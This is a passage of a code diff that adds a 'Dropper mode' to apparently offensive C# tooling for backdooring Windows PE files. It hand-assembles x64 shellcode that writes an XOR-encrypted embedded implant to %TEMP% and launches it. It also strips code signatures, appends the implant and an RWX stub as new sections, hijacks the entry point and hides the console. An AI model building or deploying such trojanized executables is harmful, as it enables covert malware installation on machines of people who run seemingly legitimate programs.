+        // arg5 dwCreationDisposition=CREATE_ALWAYS=2: mov r8d, 2; mov [rsp+0x20],r8
+        buf.AddRange(new byte[] { 0x41, 0xB8, 0x02, 0x00, 0x00, 0x00 });
+        buf.AddRange(new byte[] { 0x4C, 0x89, 0x44, 0x24, 0x20 });
+        // arg4 lpSecurityAttributes=NULL: xor r9, r9
+        buf.AddRange(new byte[] { 0x4D, 0x31, 0xC9 });
+        // arg3 dwShareMode=0: xor r8d, r8d
+        buf.AddRange(new byte[] { 0x45, 0x31, 0xC0 });
+        // arg2 dwDesiredAccess=GENERIC_WRITE=0x40000000: mov edx, 0x40000000
+        buf.AddRange(new byte[] { 0xBA, 0x00, 0x00, 0x00, 0x40 });
+        // arg1 lpFileName=&pathBuf: lea rcx, [rsp+0x80]  (frame+0x40; after sub 0x40: rsp+0x80 → disp32)
+        buf.AddRange(new byte[] { 0x48, 0x8D, 0x8C, 0x24, 0x80, 0x00, 0x00, 0x00 });
+        // call rax
+        buf.AddRange(new byte[] { 0xFF, 0xD0 });
+        // add rsp, 0x40
+        buf.AddRange(new byte[] { 0x48, 0x83, 0xC4, 0x40 });
+        // mov [rsp+SLOT_HFILE], rax  (store hFile)
+        buf.AddRange(new byte[] { 0x48, 0x89, 0x44, 0x24, SLOT_HFILE });
+
+        // ── [WriteFile(hFile, r13, dplSize, &bw, NULL)] ─────────────────
+        // mov rax, [rsp+SLOT_WF]
+        buf.AddRange(new byte[] { 0x48, 0x8B, 0x44, 0x24, SLOT_WF });
+        // sub rsp, 0x30  (shadow(0x20) + NULL(0x8) + pad(0x8))
+        buf.AddRange(new byte[] { 0x48, 0x83, 0xEC, 0x30 });
+        // arg5 lpOverlapped=NULL: xor rcx,rcx; mov [rsp+0x20],rcx
+        buf.AddRange(new byte[] { 0x48, 0x31, 0xC9 });
+        buf.AddRange(new byte[] { 0x48, 0x89, 0x4C, 0x24, 0x20 });
+        // arg4 lpBytesWritten=&bw: lea r9, [rsp+0x60]  (frame+0x30; after sub 0x30: rsp+0x60 → disp8)
+        buf.AddRange(new byte[] { 0x4C, 0x8D, 0x4C, 0x24, 0x60 });
+        // arg3 nNumberOfBytesToWrite=dplSize: mov r8d, dplSize
+        buf.AddRange(new byte[] { 0x41, 0xB8 });
+        buf.AddRange(BitConverter.GetBytes(dplSize));
+        // arg2 lpBuffer=R13 (decrypted .dpl VA): mov rdx, r13
+        buf.AddRange(new byte[] { 0x4C, 0x89, 0xEA });
+        // arg1 hFile: mov rcx, [rsp+0x58]  (frame+0x28; after sub 0x30: rsp+0x58 → disp8)
+        buf.AddRange(new byte[] { 0x48, 0x8B, 0x4C, 0x24, 0x58 });
+        buf.AddRange(new byte[] { 0xFF, 0xD0 });                               // call rax
+        buf.AddRange(new byte[] { 0x48, 0x83, 0xC4, 0x30 });                   // add rsp, 0x30
+
+        // ── [CloseHandle(hFile)] ─────────────────────────────────────────
+        // mov rax, [rsp+SLOT_CH]
+        buf.AddRange(new byte[] { 0x48, 0x8B, 0x44, 0x24, SLOT_CH });
+        buf.AddRange(new byte[] { 0x48, 0x83, 0xEC, 0x20 });                   // sub rsp, 0x20
+        // mov rcx, [rsp+0x48]  (frame+0x28; after sub 0x20: rsp+0x48)
+        buf.AddRange(new byte[] { 0x48, 0x8B, 0x4C, 0x24, 0x48 });
+        buf.AddRange(new byte[] { 0xFF, 0xD0 });                               // call rax
+        buf.AddRange(new byte[] { 0x48, 0x83, 0xC4, 0x20 });                   // add rsp, 0x20
+
+        // ── [Zero STARTUPINFOW at frame+0x140] ───────────────────────────
+        // lea rdi, [rsp+0x140]  (frame+0x140; disp32=0x00000140)
+        buf.AddRange(new byte[] { 0x48, 0x8D, 0xBC, 0x24, 0x40, 0x01, 0x00, 0x00 });
+        // mov ecx, 13  (13 × 8 = 104 bytes = sizeof STARTUPINFOW + PROCESS_INFORMATION)
+        buf.AddRange(new byte[] { 0xB9, 0x0D, 0x00, 0x00, 0x00 });
+        // xor rax, rax
+        buf.AddRange(new byte[] { 0x48, 0x31, 0xC0 });
+        // rep stosq
+        buf.AddRange(new byte[] { 0xF3, 0x48, 0xAB });
+        // mov dword [rsp+0x140], 0x68  (STARTUPINFOW.cb = sizeof(STARTUPINFOW); disp32)
+        buf.AddRange(new byte[] { 0xC7, 0x84, 0x24, 0x40, 0x01, 0x00, 0x00, 0x68, 0x00, 0x00, 0x00 });
+
+        // ── [CreateProcessW(path, NULL, NULL, NULL, 0, 0, NULL, NULL, &SI, &PI)] ──
+        // mov rax, [rsp+SLOT_CPW]
+        buf.AddRange(new byte[] { 0x48, 0x8B, 0x44, 0x24, SLOT_CPW });
+        // sub rsp, 0x50  (shadow(0x20) + 6 stack args(0x30))
+        buf.AddRange(new byte[] { 0x48, 0x83, 0xEC, 0x50 });
+        // xor r11, r11  (zero register for NULL / 0 args)
+        buf.AddRange(new byte[] { 0x4D, 0x31, 0xDB });
+        // arg10 lpProcessInformation=&PI: lea rcx,[rsp+0x1F8]; mov [rsp+0x48],rcx
+        buf.AddRange(new byte[] { 0x48, 0x8D, 0x8C, 0x24, 0xF8, 0x01, 0x00, 0x00 });
+        buf.AddRange(new byte[] { 0x48, 0x89, 0x4C, 0x24, 0x48 });
+        // arg9  lpStartupInfo=&SI:  lea rcx,[rsp+0x190]; mov [rsp+0x40],rcx
+        buf.AddRange(new byte[] { 0x48, 0x8D, 0x8C, 0x24, 0x90, 0x01, 0x00, 0x00 });
+        buf.AddRange(new byte[] { 0x48, 0x89, 0x4C, 0x24, 0x40 });
+        // arg8 lpCurrentDirectory=NULL: mov [rsp+0x38], r11
+        buf.AddRange(new byte[] { 0x4C, 0x89, 0x5C, 0x24, 0x38 });
+        // arg7 lpEnvironment=NULL:    mov [rsp+0x30], r11
+        buf.AddRange(new byte[] { 0x4C, 0x89, 0x5C, 0x24, 0x30 });
+        // arg6 dwCreationFlags=0:     mov [rsp+0x28], r11
+        buf.AddRange(new byte[] { 0x4C, 0x89, 0x5C, 0x24, 0x28 });
+        // arg5 bInheritHandles=0:     mov [rsp+0x20], r11
+        buf.AddRange(new byte[] { 0x4C, 0x89, 0x5C, 0x24, 0x20 });
+        // arg4 lpThreadAttributes=NULL: mov r9, r11
+        buf.AddRange(new byte[] { 0x4D, 0x89, 0xD9 });
+        // arg3 lpProcessAttributes=NULL: mov r8, r11
+        buf.AddRange(new byte[] { 0x4D, 0x89, 0xD8 });
+        // arg2 lpCommandLine=NULL:    mov rdx, r11
+        buf.AddRange(new byte[] { 0x4C, 0x89, 0xDA });
+        // arg1 lpApplicationName=pathBuf: lea rcx,[rsp+0x90]  (frame+0x40 after sub 0x50: disp32)
+        buf.AddRange(new byte[] { 0x48, 0x8D, 0x8C, 0x24, 0x90, 0x00, 0x00, 0x00 });
+        buf.AddRange(new byte[] { 0xFF, 0xD0 });                               // call rax
+        buf.AddRange(new byte[] { 0x48, 0x83, 0xC4, 0x50 });                   // add rsp, 0x50
+
+        // ── [Deallocate frame + restore registers] ───────────────────────
+        // add rsp, 0x288
+        buf.AddRange(new byte[] { 0x48, 0x81, 0xC4, 0x88, 0x02, 0x00, 0x00 });
+        buf.AddRange(X64RestoreRegs);
+
+        // ── [JMP OEP placeholder] ────────────────────────────────────────
+        buf.Add(0xE9);
+        buf.AddRange(new byte[4]);                                              // patched by PatchPayloadJmpOffset
+
+        // ── [Patch remaining offsets] ────────────────────────────────────
+        var bytes = buf.ToArray();
+        bytes[xorJlPos + 1] = unchecked((byte)(xorLoopPos - (xorJlPos + 2)));
+
+        return bytes;
+    }
+
+    // ─────────────────────────────────────────────────────────────────────
+    //  BackdoorDropperAsync — orchestrator for Dropper mode
+    // ─────────────────────────────────────────────────────────────────────
+    private async Task<BackdoorResult> BackdoorDropperAsync(
+        PeBackdoorOptions options, byte[] peData, ParsedPe pe, BackdoorResult result)
+    {
+        // Dropper requires x64 (PIC stub is x64-only).
+        if (!pe.Is64Bit)
+        {
+            result.ErrorMessage = "Dropper mode is only supported for x64 PE files.";
+            return result;
+        }
+
+        if (string.IsNullOrEmpty(options.ImplantPath) || !File.Exists(options.ImplantPath))
+        {
+            result.ErrorMessage = $"Implant EXE not found: {options.ImplantPath}";
+            return result;
+        }
+
+        // Strip signature overlay before modifying sections.
+        if (pe.HasSignature && options.RemoveSignature)
+        {
+            peData = StripSignatureOverlay(peData, pe);
+            pe = ParsePe(peData);
+            result.Steps.Add($"Stripped signature overlay (file now {peData.Length:N0} bytes)");
+        }
+
+        // Read implant and XOR-encrypt it.
+        var implantBytes = await File.ReadAllBytesAsync(options.ImplantPath);
+        result.Steps.Add($"Loaded implant: {implantBytes.Length:N0} bytes from {Path.GetFileName(options.ImplantPath)}");
+
+        // Choose a non-zero XOR key.
+        byte xorKey;
+        do { xorKey = (byte)Random.Shared.Next(1, 256); } while (xorKey == 0);
+        var encryptedImplant = (byte[])implantBytes.Clone();
+        for (int i = 0; i < encryptedImplant.Length; i++)
+            encryptedImplant[i] ^= xorKey;
+        result.Steps.Add($"XOR-encrypted implant (key=0x{xorKey:X2})");
+
+        // Append .dpl section with encrypted implant.
+        uint dplRva, dplSize;
+        (peData, dplRva, dplSize) = AppendDplSection(peData, pe, encryptedImplant);
+        pe = ParsePe(peData);
+        result.Steps.Add($"Appended .dpl section: RVA=0x{dplRva:X}, size={dplSize:N0} bytes");
+
+        // Build PIC dropper stub.
+        options.Method = InjectionMethod.NewSection;
+        var fullPayload = BuildDropperPayload(dplRva, dplSize, xorKey);
+        result.Steps.Add($"Built dropper stub: {fullPayload.Length} bytes");
+
+        // Inject stub as a new +RWX section.
+        uint payloadRva;
+        (peData, payloadRva) = InjectNewSection(peData, pe, fullPayload, options.NewSectionName, result);
+        pe = ParsePe(peData);
+
+        // Patch the trailing E9 JMP to original OEP.
+        // The E9 is always the last 5 bytes of the dropper stub.
+        int jmpOffset = fullPayload.Length - 5;
+        peData = PatchPayloadJmpOffset(peData, pe, fullPayload.Length, payloadRva, jmpOffset);
+        result.Steps.Add($"Patched resume JMP → original entry point 0x{pe.AddressOfEntryPoint:X}");
+
+        // Redirect entry point to dropper stub.
+        peData = PatchEntryPointField(peData, pe, payloadRva);
+        result.Steps.Add($"Entry point: 0x{pe.AddressOfEntryPoint:X} → 0x{payloadRva:X}");
+
+        if (options.PatchSubsystemToGui && !pe.IsDll)
+        {
+            peData = PatchSubsystemInternal(peData, pe);
+            result.Steps.Add("Patched subsystem to GUI (hidden console)");
+        }
+
+        peData = RecalculateChecksum(peData, pe);
+        result.Steps.Add("Recalculated PE checksum");
+
+        // Write output.
+        var outputPath = options.OutputPath;
+        if (string.IsNullOrEmpty(outputPath))
+        {
+            var dir  = Path.GetDirectoryName(options.TargetPePath)!;
+            var name = Path.GetFileNameWithoutExtension(options.TargetPePath);
+            var ext  = Path.GetExtension(options.TargetPePath);
+            outputPath = Path.Combine(dir, $"{name}.dropper{ext}");
+        }
+
+        var outDir = Path.GetDirectoryName(outputPath);
+        if (!string.IsNullOrEmpty(outDir) && !Directory.Exists(outDir))
+            Directory.CreateDirectory(outDir);
+
+        await File.WriteAllBytesAsync(outputPath, peData);
+        result.OutputPath = outputPath;
+        result.Success = true;
+        result.Steps.Add($"Output: {outputPath} ({peData.Length:N0} bytes)");
+        result.Warnings.Add("Dropper: implant EXE is written to %TEMP%\\~dpl.exe on first execution.");
+        _logger.Ok($"Dropper PE written to: {outputPath}");
+
+        return result;
+    }
+
     /// <summary>
     /// Scan shellcode for destructive exit function patterns and patch them to ExitThread.
     /// Handles Metasploit-style ROR13 hash-based API resolution (block_api.asm) and
